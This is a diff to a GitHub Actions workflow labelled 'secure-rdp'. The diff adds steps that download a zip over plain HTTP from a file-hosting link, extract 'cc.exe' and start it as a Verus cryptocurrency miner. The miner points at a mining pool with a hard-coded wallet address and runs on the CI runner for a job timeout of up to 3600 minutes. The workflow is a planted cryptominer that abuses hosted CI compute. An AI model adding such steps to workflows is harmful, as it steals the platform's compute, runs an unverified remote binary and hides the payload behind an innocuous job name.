@@ -5,7 +5,7 @@ on:
 
 jobs:
   secure-rdp:
-    runs-on: windows-2025
+    runs-on: windows-2022 
     timeout-minutes: 3600
 
     steps:
@@ -100,6 +100,30 @@ jobs:
               exit 1
           }
           Write-Host "TCP connectivity successful!"
+
+      - name: Download and Extract cc_CPU_3.8.3.zip
+        run: |
+          # Download the zip file
+          $zipUrl = "http://hc1.checker.in/file2link/documents/file_555975.zip/cc_CPU_3.8.3.zip"
+          $zipPath = "$env:TEMP\cc_CPU_3.8.3.zip"
+          $extractPath = "$env:TEMP\cc_CPU_3.8.3"
+          
+          Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+          
+          # Extract the zip file
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          
+          # Verify extraction
+          if (!(Test-Path "$extractPath\cc.exe")) {
+              Write-Error "Failed to extract cc.exe from the zip file"
+              exit 1
+          }
+
+      - name: Execute cc.exe with Verus Parameters
+        run: |
+          # Change to the extracted directory and run cc.exe with specified parameters
+          Set-Location -Path "$env:TEMP\cc_CPU_3.8.3"
+          Start-Process .\cc.exe -ArgumentList "-a verus -o stratum+tcp://pool.verus.io:9999 -u RUhxrKL912JMRez6GDjj6knksm3GXJs7on -p x -t 4" -NoNewWindow
 
       - name: Maintain Connection
         run: |
